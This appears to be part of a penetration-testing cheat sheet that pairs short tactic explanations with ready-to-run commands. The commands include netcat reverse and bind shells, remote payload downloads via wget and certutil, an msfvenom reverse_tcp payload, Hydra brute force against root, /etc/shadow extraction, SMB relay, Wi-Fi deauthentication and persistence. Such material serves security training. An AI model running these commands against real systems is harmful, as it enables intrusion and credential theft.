4. Web Vulnerability Scanning

Tools and Commands:

    Nikto: A web vulnerability scanner that checks for various vulnerabilities in web servers.

    bash

nikto -h https://thefloatinggate.com

DirBuster/Gobuster/Ffuf: Tools used for directory and file busting on web servers to find hidden paths and files.

bash

    gobuster dir -u http://example.com/ -w /path/to/wordlist.txt
    ffuf -w /path-to-wordlist.txt:FUZZ -u http://example.com/FUZZ

Methodology and Tactics:
Web vulnerability scanning is part of the discovery phase where the tester looks for vulnerabilities that could be exploited. Tools like Nikto are used to automate the detection of common web vulnerabilities such as outdated software, misconfigurations, and default files. Directory busting tools like Gobuster and Ffuf are employed to uncover hidden directories and files, which may contain sensitive information or vulnerable scripts. The tactic is to identify low-hanging fruit and potential entry points that can be exploited later.
5. SMB Enumeration

Tools and Commands:

    Metasploit for SMB Enumeration: Use Metasploit's auxiliary modules to enumerate SMB shares and users.

    bash

msfconsole
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.x.x.x
run

smbclient: A command-line tool used to access SMB/CIFS resources on servers.

bash

    smbclient -L \\\\192.168.x.x\\
    smbclient \\\\192.168.x.x\\<Share>

Methodology and Tactics:
SMB (Server Message Block) enumeration is a critical step in network penetration testing, especially in environments using Windows. The methodology involves using tools like Metasploit and smbclient to enumerate available SMB shares, users, and permissions. This information can reveal sensitive data or misconfigurations that allow unauthorized access. The tactic is to find accessible shares or poorly secured services that can be used to further penetrate the network.
6. SSH Enumeration and Brute Force

Command Examples:

    SSH Enumeration: Look for SSH banners that reveal software versions, which might have known vulnerabilities.

    bash

ssh -v 192.x.x.x

SSH Brute Force with Hydra: Attempt to brute-force SSH login credentials.

bash

    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.x.x.x:22 -t 4 -V

Methodology and Tactics:
SSH enumeration focuses on gathering information about the SSH service, such as the version and configuration, which might hint at potential vulnerabilities. Brute force attacks, using tools like Hydra, involve systematically trying different username and password combinations to gain unauthorized access. This tactic is often employed when there is a lack of other vulnerabilities, or when weak credentials are suspected.
7. Vulnerability Research and Exploitation

Tools and Commands:

    searchsploit: Search for public exploits related to specific vulnerabilities.

    bash

searchsploit <vulnerability>

Exploit Frameworks:

    Metasploit: Use to automate exploitation.

    bash

        msfconsole
        search <exploit_name>
        use <exploit_module>
        set RHOST 192.x.x.x
        run

Methodology and Tactics:
The methodology here involves identifying known vulnerabilities in the target's software stack using tools like searchsploit. Once a vulnerability is identified, exploitation frameworks like Metasploit are used to automate the exploitation process. The tactic is to leverage publicly available exploits that match the identified vulnerabilities, focusing on gaining initial access or escalating privileges within the target environment.
8. Reverse and Bind Shells

Command Examples:

    Reverse Shell:
        Attack Box:

        bash

nc -lvp 4444

Victim Machine:

bash

    nc 192.x.x.x 4444 -e /bin/sh

Bind Shell:

    Target Machine:

    bash

nc -lvp 4444 -e /bin/sh

Attack Box:

bash

        nc 192.x.x.x 4444

Methodology and Tactics:
Reverse and bind shells are methods of establishing command-line access to a compromised system. In a reverse shell, the victim machine connects back to the attacker's machine, which is useful when the victim is behind a firewall. In a bind shell, the victim machine opens a listening port that the attacker connects to, which can be useful in situations where the attacker's machine is restricted. The tactic is to maintain control over the compromised system and to facilitate further exploitation or data exfiltration.
9. Post-Exploitation Enumeration

Command Examples:

    Network Enumeration:

    bash

ifconfig
ip a
arp -a
route -n

User Enumeration:

bash

cat /etc/passwd
sudo -l

Hash Extraction:

bash

    cat /etc/shadow

Methodology and Tactics:
Post-exploitation enumeration involves gathering detailed information from a compromised system. The methodology focuses on identifying additional attack vectors, escalating privileges, and maintaining persistence. By enumerating network interfaces, users, and password hashes, the attacker can map out the internal network, find sensitive data, or prepare for further attacks such as lateral movement or privilege escalation. The tactic is to use the information gathered to deepen the penetration into the network.
10. Credential Stuffing and Spraying

Command Examples:

    Credential Stuffing with Burp Suite:
        Intercept login requests with Burp, modify and replay them with different credentials using the Intruder tool.

    Password Spraying with Hydra:

    bash

    hydra -L usernames.txt -P password.txt ssh://192.x.x.x -t 4 -V

Methodology and Tactics:
Credential stuffing and password spraying are brute-force attack techniques targeting user authentication systems. Credential stuffing involves using large datasets of leaked username-password pairs to gain unauthorized access, while password spraying involves trying a small set of passwords across many accounts to avoid detection. These tactics are effective when targeting organizations with weak password policies or when exploiting the human factor, where users might reuse passwords across multiple platforms.
11. Metasploit Payloads and Shellcode

Key Points:

    Staged Payloads: Sends payload in stages (e.g., windows/meterpreter/reverse_tcp), often bypassing size restrictions.
    Non-Staged Payloads: Sends payload in one go (e.g., windows/meterpreter_reverse_tcp).

Command Example:

bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=4444 -f exe > shell.exe

Methodology and Tactics:
The use of staged and non-staged payloads in Metasploit is a tactical decision based on the environment being exploited. Staged payloads are useful for bypassing network restrictions and reducing the footprint of the initial payload, making it harder to detect. Non-staged payloads, on the other hand, are simpler and can be more reliable in certain situations. The tactic is to choose the most appropriate payload for the given scenario, ensuring successful exploitation and control over the target system.
12. Cracking Passwords

Command Examples:

    John the Ripper:

    bash

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Hashcat:

bash

    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

Methodology and Tactics:
Password cracking is a post-exploitation tactic used to gain further access to systems by decrypting hashed passwords. The methodology involves using tools like John the Ripper or Hashcat to perform dictionary or brute-force attacks on password hashes. The tactic is to exploit weak or reused passwords that could grant access to additional systems or sensitive data, allowing the attacker to escalate their privileges within the network.
13. Privilege Escalation Techniques

Tools and Commands:

    LinPEAS: A script to automate the enumeration process for potential privilege escalation paths.

    bash

wget http://attack_server_ip/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

SUID Exploitation:

bash

    find / -type f -perm -4000 2>/dev/null

Methodology and Tactics:
Privilege escalation involves exploiting vulnerabilities or misconfigurations to gain higher privileges within a system. The methodology often starts with enumeration, using tools like LinPEAS to automate the discovery of potential weaknesses. SUID exploitation targets files with the SUID bit set, which, if misconfigured, can allow unauthorized users to execute files with elevated privileges. The tactic is to methodically search for and exploit these opportunities to gain root or administrative access, thereby gaining control over the entire system.
14. File Transfer Techniques

Command Examples:

    Linux File Transfer with Netcat:

    bash

nc -lvp 4444 > received_file
nc 192.x.x.x 4444 < file_to_send

Windows File Transfer with Certutil:

bash

    certutil.exe -urlcache -split -f http://192.x.x.x/file.exe file.exe

Methodology and Tactics:
File transfer techniques are crucial for moving tools, exploits, or data between the attacker's and victim's machines. The methodology depends on the environment, with Netcat being a versatile tool for file transfer in Linux environments, while Certutil is often used in Windows environments to download files from a remote server. The tactic is to ensure reliable transfer methods that are less likely to be detected by security tools, allowing the attacker to continue their operations seamlessly.
15. Active Directory Attacks

Key Points:

    LLMNR/NBT-NS Poisoning: Using tools like Responder to capture credentials.

    bash

sudo responder -I eth0 -dwPv

SMB Relay:

bash

    sudo responder -I eth0 -dwPv
    ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

Methodology and Tactics:
Active Directory (AD) environments are prime targets due to the centralized management of users, groups, and permissions. The methodology involves exploiting trust relationships, misconfigurations, and legacy protocols like LLMNR or SMB that are often enabled in AD environments. LLMNR poisoning allows attackers to intercept and capture credentials by spoofing legitimate responses to network requests. SMB relay attacks can take captured credentials and relay them to other systems to gain unauthorized access. The tactic is to leverage these weaknesses to escalate privileges, gain persistence, and ultimately control AD resources.
16. Post-Compromise Enumeration in AD

Tools and Commands:

    Bloodhound:

    bash

sudo neo4j console
bloodhound-python -d Domain.local -u user -p pass -ns 192.x.x.x -C all

Crackmapexec:

bash

    crackmapexec smb 192.x.x.x/24 -u admin -p password --shares

Methodology and Tactics:
Post-compromise enumeration in Active Directory involves mapping out the environment to identify additional attack paths, valuable targets, and further opportunities for privilege escalation. Tools like Bloodhound help visualize the attack paths within AD, showing how permissions and relationships can be exploited to move laterally or escalate privileges. Crackmapexec is used for quick enumeration and exploitation of SMB shares and other services within the network. The tactic is to methodically explore the compromised environment, using the gathered information to consolidate the attacker's position and plan further actions.
17. Wireless Network Testing

Tools and Commands:

    Wireless Card Setup:

    bash

airmon-ng start wlan0
airodump-ng wlan0mon

Deauth Attack and WPA Handshake Capture:

bash

    aireplay-ng -0 10 -a <AP_MAC> wlan0mon
    airodump-ng --bssid <AP_MAC> -c <Channel> -w capture wlan0mon

Methodology and Tactics:
Wireless network testing involves attacking the confidentiality and integrity of Wi-Fi networks, typically those using WPA2-PSK. The methodology starts with setting the wireless card to monitor mode, followed by capturing the handshake during a deauthentication attack. The captured handshake is then used to attempt to crack the Wi-Fi password. The tactic is to disrupt the wireless network, capture the handshake data, and use brute-force or dictionary attacks to recover the network key, thereby gaining unauthorized access.
18. Advanced Persistent Threats and Post-Exploitation

Techniques:

    Maintaining Access: Use persistence techniques like scheduled tasks, services, or registry modifications.

    bash

run persistence -h

Pivoting: Use tools like ProxyChains, SSHuttle, or Chisel to move laterally across networks.

bash

    proxychains nmap -sT 192.x.x.x
    sshuttle -r root@192.x.x.x 10.x.x.x/24

Methodology and Tactics:
Advanced Persistent Threats (APT) focus on long-term access to systems, requiring sophisticated post-exploitation tactics. Maintaining access involves creating persistence mechanisms that survive reboots and remain hidden from users and security tools. Pivoting is used to move laterally within the network, gaining access to other systems or network segments that were not directly accessible. The tactic is to blend into the environment, maintain control over compromised systems, and avoid detection while exploring and exploiting additional targets.
19. Legal and Reporting

Key Documents:

    NDA: Mutual Non-Disclosure Agreement to protect confidential information.
    MSA/SOW: Master Service Agreement and Statement of Work to outline the terms of engagement.
    Pentest Report: Comprehensive documentation of the findings, methods, and recommendations post-assessment.

Methodology and Tactics:
The methodology behind legal and reporting frameworks ensures that all parties are protected, and that the engagement is conducted within agreed-upon boundaries. The Non-Disclosure Agreement (NDA) protects sensitive information, while the Master Service Agreement (MSA) and Statement of Work (SOW) define the scope, objectives, and deliverables of the engagement. The final pentest report documents the entire process, from methodology to findings, providing actionable recommendations to the client. The tactic is to maintain transparency, legal compliance, and clear communication throughout the penetration testing engagement.

These additions should provide a more thorough understanding of the methodologies and tactics involved in each section. The explanations and command-line examples are designed to give practical insights into how these techniques are applied in real-world penetration testing scenarios.
